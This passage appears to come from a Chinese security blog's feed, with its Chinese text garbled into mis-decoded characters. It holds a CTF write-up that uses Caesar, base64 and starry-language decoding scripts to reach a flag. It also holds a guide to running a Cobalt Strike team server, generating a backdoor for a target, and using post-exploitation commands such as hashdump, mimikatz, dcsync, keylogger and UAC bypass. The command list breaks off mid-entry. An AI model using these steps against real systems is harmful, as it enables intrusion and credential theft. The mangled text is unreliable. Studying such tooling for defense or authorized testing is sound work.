DBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLhphLzBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhDjBsLjBsJDBhJDBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDpLJDBhJDBhJDtrLjBsJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJBphJDthJDphJDBhJDBsLjBsJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhDjBhJDBhLzBhLjBhJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBLLzBhLjBhJDBhLzphJDBhJD4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLhphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhDjBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBLJDphJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJBphLzphJDBhJDBhMjBhJDBhJDBvJDBhJDBhJD4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthDjBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBsJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBLLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBsJDBhJDBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJBphJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsDjBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBLJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhMjBhJDBhMjBsJDBhMjBhJDBhLxphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDthJDBhDjBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBLJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhLzBhJDBhJDBhLxphJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphMjBvJD4hLzBhJDBhMjBhJDBhDjthJDBhJDBhJDthJDphJDBhJDBsLjBrJDthJDBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBLJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJBphJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhDjBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBLJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJBphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhMjBhJDBhMjBhJDBhMjBhJDBhDj4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBLJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLxprJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhDjBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphMjBvJDthMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBLJDBhJDthJDphJDBhJDBsLjBsJDBhJDBhJD4=</span><br></pre></td></tr></table></figure><blockquote><p>çœ‹åˆ°æœ«å°¾çš„=ï¼Œæƒ³åˆ°base64ï¼Œæ‰€ä»¥æ˜¯å‡¯æ’’ä¸base64çš„ç»“åˆã€‚</p><p>å…ˆç”¨è„šæœ¬çˆ†ç ´å‡¯æ’’ï¼Œå°†ç»“æœç”¨base64ç¼–ç </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"># æˆªå–æ–‡ä»¶æœ€å‰é¢ä¸€éƒ¨åˆ†è¿›è¡ŒçŒœæµ‹ï¼Œå› ä¸ºæ ¹æ®åé¢å¯çŸ¥è¿™ä¸€éƒ¨åˆ†æ˜¯è¿‘ä¼¼çš„å››å­—ç¬¦åå¤é‡å¤</span><br><span class="line">key = &quot;JDBhJDBsJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBh&quot;</span><br><span class="line"> </span><br><span class="line"># éå†å‡¯æ’’åŠ å¯†ä¸­25ç§çš„å¯èƒ½æ€§</span><br><span class="line">for n in range(0, 26):</span><br><span class="line">    str_encrypt = &quot;&quot;</span><br><span class="line">    for letter in key:</span><br><span class="line">        if &quot;a&quot; &lt;= letter &lt;= &quot;z&quot;:</span><br><span class="line">            str_encrypt += chr((ord(letter) - ord(&quot;a&quot;) + n) % 26 + ord(&quot;a&quot;))</span><br><span class="line">        elif &quot;A&quot; &lt;= letter &lt;= &quot;Z&quot;:</span><br><span class="line">            str_encrypt += chr((ord(letter) - ord(&quot;A&quot;) + n) % 26 + ord(&quot;A&quot;))</span><br><span class="line">        else:</span><br><span class="line">            str_encrypt += letter</span><br><span class="line"> </span><br><span class="line">    # è¾“å‡ºæ¯ä¸€ç§å¯èƒ½æ€§æœ€åçš„ç»“æœ</span><br><span class="line">    print(base64.decodebytes(str_encrypt.encode()))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241119234133869.png" alt="image-20241119234133869"></p><blockquote><p>ç»“æœä¸­å‘ç°åªæœ‰å½“n=25æ—¶ï¼Œä¼šå‡ºç°starryè¯­è¨€ç‰¹æœ‰çš„+ï¼Œ*ç­‰ç¬¦å·</p><p>äºæ˜¯ç”¨è„šæœ¬å°†å…¶å…¨éƒ¨è½¬åŒ–æˆstarryè¯­è¨€</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">with open(&quot;C:\\Users\\Lucky\\Desktop\\åç§‘æ¯\\misc\\ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶\\flag.txt&quot;, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:    #flag.txtæ˜¯å‡¯æ’’å¯†ç çš„æ–‡æœ¬</span><br><span class="line">    str_encrypt = &quot;&quot;</span><br><span class="line">    n = 25</span><br><span class="line">    for letter in f.read():</span><br><span class="line">        if &quot;a&quot; &lt;= letter &lt;= &quot;z&quot;:</span><br><span class="line">            str_encrypt += chr((ord(letter) - ord(&quot;a&quot;) + n) % 26 + ord(&quot;a&quot;))</span><br><span class="line">        elif &quot;A&quot; &lt;= letter &lt;= &quot;Z&quot;:</span><br><span class="line">            str_encrypt += chr((ord(letter) - ord(&quot;A&quot;) + n) % 26 + ord(&quot;A&quot;))</span><br><span class="line">        else:</span><br><span class="line">            str_encrypt += letter</span><br><span class="line">    open(&quot;C:\\Users\\Lucky\\Desktop\\åç§‘æ¯\\misc\\ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶\\flag.starry&quot;, &quot;wb&quot;).write(base64.decodebytes(str_encrypt.encode()))</span><br></pre></td></tr></table></figure><blockquote><p>æœ€åç”¨starryè¯­è¨€è½¬æ¢è„šæœ¬è½¬æ¢å°±èƒ½å¾—åˆ°flag</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">fp = open(&#x27;C:\\Users\\Lucky\\Desktop\\åç§‘æ¯\\misc\\ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶\\flag.starry&#x27;)     #flag.starryæ˜¯ä¿å­˜çš„starryè¯­è¨€æ–‡ä»¶</span><br><span class="line">data = fp.read()</span><br><span class="line">fs = open(&#x27;C:\\Users\\Lucky\\Desktop\\åç§‘æ¯\\misc\\ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶\\f.txt&#x27;, &#x27;w&#x27;)       #f.txtæ˜¯è¾“å‡ºçš„ä¸­é—´æ–‡ä»¶</span><br><span class="line">sub = 0</span><br><span class="line">for i in data:</span><br><span class="line">    if i == &#x27;\n&#x27;:</span><br><span class="line">        continue</span><br><span class="line">    elif i == &#x27; &#x27;:</span><br><span class="line">        sub += 1</span><br><span class="line">    elif i == &#x27;+&#x27;:</span><br><span class="line">        if sub == 1:</span><br><span class="line">            fs.write(&#x27;dup\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 2:</span><br><span class="line">            fs.write(&#x27;swap\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 3:</span><br><span class="line">            fs.write(&#x27;rotate\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 4:</span><br><span class="line">            fs.write(&#x27;pop\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        else:</span><br><span class="line">            fs.write(&#x27;push  &#x27; + str(sub-5) + &#x27;\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">    elif i == &#x27;*&#x27;:</span><br><span class="line">        if sub == 0:</span><br><span class="line">            fs.write(&#x27;+\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 1:</span><br><span class="line">            fs.write(&#x27;-\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 2:</span><br><span class="line">            fs.write(&#x27;*\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 3:</span><br><span class="line">            fs.write(&#x27;/\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 4:</span><br><span class="line">            fs.write(&#x27;%\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;error!!!&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">            sys.exit()</span><br><span class="line">    elif i == &#x27;.&#x27;:</span><br><span class="line">        if sub == 0:</span><br><span class="line">            fs.write(&#x27;num_out\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        else:</span><br><span class="line">            fs.write(&#x27;char_out\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;error!!!!&#x27;)</span><br><span class="line">        sys.exit()</span><br><span class="line">fp.close()</span><br><span class="line">fs.close()</span><br><span class="line">fp = open(&#x27;C:\\Users\\Lucky\\Desktop\\åç§‘æ¯\\misc\\ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶\\f.txt&#x27;, &#x27;r&#x27;)</span><br><span class="line">data = []</span><br><span class="line">for line in fp:</span><br><span class="line">    line = line.strip(&#x27;\n&#x27;)</span><br><span class="line">    if line[:4] == &#x27;push&#x27;:</span><br><span class="line">        data.append(int(line.split(&#x27;  &#x27;)[1]))</span><br><span class="line">    elif line == &#x27;*&#x27;:</span><br><span class="line">        x = data[-1]</span><br><span class="line">        y = data[-2]</span><br><span class="line">        data = data[:-2]</span><br><span class="line">        data.append(x * y)</span><br><span class="line">    elif line == &#x27;+&#x27;:</span><br><span class="line">        x = data[-1]</span><br><span class="line">        y = data[-2]</span><br><span class="line">        data = data[:-2]</span><br><span class="line">        data.append(x + y)</span><br><span class="line">    elif line == &#x27;-&#x27;:</span><br><span class="line">        x = data[-1]</span><br><span class="line">        y = data[-2]</span><br><span class="line">        data = data[:-2]</span><br><span class="line">        if (x-y)&lt;0:</span><br><span class="line">            data.append(y-x)</span><br><span class="line">        else:</span><br><span class="line">            data.append(x-y)</span><br><span class="line">    elif line == &#x27;dup&#x27;:</span><br><span class="line">        x = data[-1]</span><br><span class="line">        data.append(x)</span><br><span class="line">    elif line == &#x27;char_out&#x27;:</span><br><span class="line">        x = data[-1]</span><br><span class="line">        data = data[:-1]</span><br><span class="line">        print(chr(x),end=&quot;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;error!!!&#x27;)</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure><blockquote><p>flag{785c45ea-d2a1-4993-8d4f-325323d5bcd9}</p></blockquote>]]></content>
    
    
    <summary type="html">ğŸ¥§åç§‘ç¬¬ä¸€å±Šç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="æ¯”èµ›wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike4.8æ±‰åŒ–ç‰ˆå¸¦æ’ä»¶ä½¿ç”¨æ–¹æ³•</title>
    <link href="https://m3x1.cn/posts/4aeca11a.html"/>
    <id>https://m3x1.cn/posts/4aeca11a.html</id>
    <published>2024-11-17T16:00:00.000Z</published>
    <updated>2024-12-02T09:11:35.855Z</updated>
    
    <content type="html"><![CDATA[<h1>CobaltStrike4.8æ±‰åŒ–ç‰ˆå¸¦æ’ä»¶ä½¿ç”¨æ–¹æ³•</h1><p>ä½¿ç”¨å¤§è‡´æµç¨‹<br>åˆ›å»ºå›¢é˜ŸæœåŠ¡å™¨-&gt;å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨-&gt;åˆ›å»ºç›‘å¬å™¨-&gt;ç”Ÿæˆåé—¨å¯¹åº”ç›‘å¬å™¨-&gt;é¶æœºè¿è¡Œåé—¨æˆåŠŸä¸Šçº¿-&gt;åæ¸—é€ï¼ˆææƒï¼Œå†…ç½‘æ¼«æ¸¸ï¼ŒåŸŸæ¸—é€ç­‰ï¼‰</p><h2 id="ä¸€ã€å®‰è£…">ä¸€ã€å®‰è£…</h2><p><img src="https://i-blog.csdnimg.cn/blog_migrate/fd8da35e28b5c9bc7b8132070b54a3c7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŠŠå…¨éƒ¨æ–‡ä»¶ä¸‹ä¸Šä¼ åˆ°å¤–ç½‘VPSä¸Šï¼Œå¹¶ç»™è¶³æƒé™<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1d68638ddd135505086d548f1c394c61.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœåŠ¡ç«¯è¿è¡Œèµ·æ¥<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/eff03a78ec9383205a4be2c0f9c6effc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœ¬åœ°ç”µè„‘ä½¿ç”¨<a href="https://so.csdn.net/so/search?q=%E5%AE%A2%E6%88%B7%E7%AB%AF&amp;spm=1001.2101.3001.7020">å®¢æˆ·ç«¯</a>è¿æ¥å³å¯<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6dad38954540036b265ccfa25241ffe7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2f791f60db73100ac4a92527dce51fe9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸»è¦è¾“å…¥<code>HOSTã€Portã€password</code>å³å¯</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/bb05f44ff7b7c4ec14c9563d55efb2d3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="äºŒã€ä¸Šçº¿">äºŒã€ä¸Šçº¿</h2><h3 id="1ã€è®¾ç½®ç›‘å¬å™¨">1ã€è®¾ç½®ç›‘å¬å™¨</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e1a94fb37712fac9533688c672ea9028.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b8c145b86c42438ac11b4b3350b249e9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="2ã€ç”Ÿæˆæœ¨é©¬åé—¨">2ã€ç”Ÿæˆæœ¨é©¬åé—¨</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/56362e228cba526ec1c3ca073c78d34c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/90ad2a56214be9a95dad682bd75de839.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/006995bcb55100b36211940a6e3fb6f0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/d2a9e1f98caa9d8913a74c34750058a5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/59550d2c11e32bc849fd98fb2e140011.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/19fe4aeb1089455d9cd7935350e4a682.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿è¡Œå³å¯ä¸Šçº¿CS<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4dffee027c99823dac41e8f4baf87f5f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>3ã€æŒ‡ä»¤å¤§å…¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">browserpivot æ³¨å…¥å—å®³è€…æµè§ˆå™¨è¿›ç¨‹</span><br><span class="line">sleep 3 å…¨éƒ¨å‘½ä»¤3ç§’æ‰§è¡Œ</span><br><span class="line">bypassuac ç»•è¿‡UAC</span><br><span class="line">cancel å–æ¶ˆæ­£åœ¨è¿›è¡Œçš„ä¸‹è½½</span><br><span class="line">cd åˆ‡æ¢ç›®å½•</span><br><span class="line">checkin å¼ºåˆ¶è®©è¢«æ§ç«¯å›è¿ä¸€æ¬¡</span><br><span class="line">clear æ¸…é™¤beaconå†…éƒ¨çš„ä»»åŠ¡é˜Ÿåˆ—</span><br><span class="line">connect Connect to a Beacon peerover TCP</span><br><span class="line">covertvpn éƒ¨ç½²Covert VPNå®¢æˆ·ç«¯</span><br><span class="line">cp å¤åˆ¶æ–‡ä»¶</span><br><span class="line">dcsync ä»DCä¸­æå–å¯†ç å“ˆå¸Œ</span><br><span class="line">desktop è¿œç¨‹VNC</span><br><span class="line">dllinject åå°„DLLæ³¨å…¥è¿›ç¨‹</span><br><span class="line">dllload ä½¿ç”¨LoadLibraryå°†DLLåŠ è½½åˆ°è¿›ç¨‹ä¸­</span><br><span class="line">download ä¸‹è½½æ–‡ä»¶</span><br><span class="line">downloads åˆ—å‡ºæ­£åœ¨è¿›è¡Œçš„æ–‡ä»¶ä¸‹è½½</span><br><span class="line">drives åˆ—å‡ºç›®æ ‡ç›˜ç¬¦</span><br><span class="line">elevate å°è¯•ææƒ</span><br><span class="line">execute åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(æ— è¾“å‡º)</span><br><span class="line">execute-assembly åœ¨ç›®æ ‡ä¸Šå†…å­˜ä¸­æ‰§è¡Œæœ¬åœ°.NETç¨‹åº</span><br><span class="line">exit é€€å‡ºbeacon</span><br><span class="line">getprivs Enable system privileges oncurrent token</span><br><span class="line">getsystem å°è¯•è·å–SYSTEMæƒé™</span><br><span class="line">getuid è·å–ç”¨æˆ·ID</span><br><span class="line">hashdump è½¬å‚¨å¯†ç å“ˆå¸Œå€¼</span><br><span class="line">help å¸®åŠ©</span><br><span class="line">inject åœ¨ç‰¹å®šè¿›ç¨‹ä¸­ç”Ÿæˆä¼šè¯</span><br><span class="line">jobkill æ€æ­»ä¸€ä¸ªåå°ä»»åŠ¡</span><br><span class="line">jobs åˆ—å‡ºåå°ä»»åŠ¡</span><br><span class="line">kerberos_ccache_use ä»ccacheæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯</span><br><span class="line">kerberos_ticket_purge æ¸…é™¤å½“å‰ä¼šè¯çš„ç¥¨æ®</span><br><span class="line">kerberos_ticket_use ä»ticketæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯</span><br><span class="line">keylogger é”®ç›˜è®°å½•</span><br><span class="line">kill ç»“æŸè¿›ç¨‹</span><br><span class="line">link Connect to a Beacon peerover a named pipe</span><br><span class="line">logonpasswords ä½¿ç”¨mimikatzè½¬å‚¨å‡­æ®å’Œå“ˆå¸Œå€¼</span><br><span class="line">ls åˆ—å‡ºæ–‡ä»¶</span><br><span class="line">make_token åˆ›å»ºä»¤ç‰Œä»¥ä¼ é€’å‡­æ®</span><br><span class="line">mimikatz è¿è¡Œmimikatz</span><br><span class="line">mkdir åˆ›å»ºä¸€ä¸ªç›®å½•</span><br><span class="line">mode dns ä½¿ç”¨DNS Aä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon)</span><br><span class="line">mode dns-txt ä½¿ç”¨DNS TXTä½œä¸ºé€šä¿¡é€šé“(ä»…é™D beacon)</span><br><span class="line">mode dns6 ä½¿ç”¨DNS AAAAä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon)</span><br><span class="line">mode http ä½¿ç”¨HTTPä½œä¸ºé€šä¿¡é€šé“</span><br><span class="line">mv ç§»åŠ¨æ–‡ä»¶</span><br><span class="line">net netå‘½ä»¤</span><br><span class="line">note å¤‡æ³¨</span><br><span class="line">portscan 